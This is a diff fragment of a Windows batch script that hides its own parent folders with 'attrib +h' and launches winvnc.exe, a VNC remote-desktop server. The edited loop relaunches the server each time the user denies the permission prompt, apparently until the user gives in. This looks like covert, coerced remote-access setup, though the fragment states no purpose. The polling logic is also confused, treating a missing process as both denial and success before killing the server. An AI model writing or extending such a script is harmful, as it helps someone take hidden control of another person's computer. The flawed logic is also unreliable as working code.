@@ -37,36 +37,30 @@ attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
 REM Start winvnc.exe to get permissions
-start /min "" winvnc.exe
+start "" winvnc.exe
 
-REM Wait for winvnc.exe to have permissions (check every 2 seconds)
-:CheckPermissions
-echo Checking permissions for winvnc.exe...
-timeout /t 2 >nul
-tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
-if errorlevel 1 (
-  goto CheckPermissions
-)
-
-REM Permissions prompt detected, wait for user decision
+REM Wait for user to make a decision on the permissions prompt
 :WaitForDecision
 echo Waiting for user to allow permissions...
 timeout /t 2 >nul
 tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
-if not errorlevel 1 (
-  REM If process is found, check again until it is terminated or allowed
+if errorlevel 1 (
+  REM If process is not found, user denied permissions, retry
+  start "" winvnc.exe
   goto WaitForDecision
 )
 
-REM If the process is not found, it means the user denied permissions or allowed it
+REM If process is found, wait for the user to grant permissions
+:CheckPermissions
+echo Checking permissions for winvnc.exe...
 timeout /t 2 >nul
 tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
-if errorlevel 1 (
-  REM If process is not found after timeout, user denied permissions, retry
+if not errorlevel 1 (
+  REM If process is found, continue waiting for user action
   goto CheckPermissions
 )
 
-REM If the process is still not found, assume permissions are granted and proceed
+REM If process is still not found, assume permissions are granted and proceed
 echo winvnc.exe has permissions. Proceeding...
 taskkill /im winvnc.exe /f
 
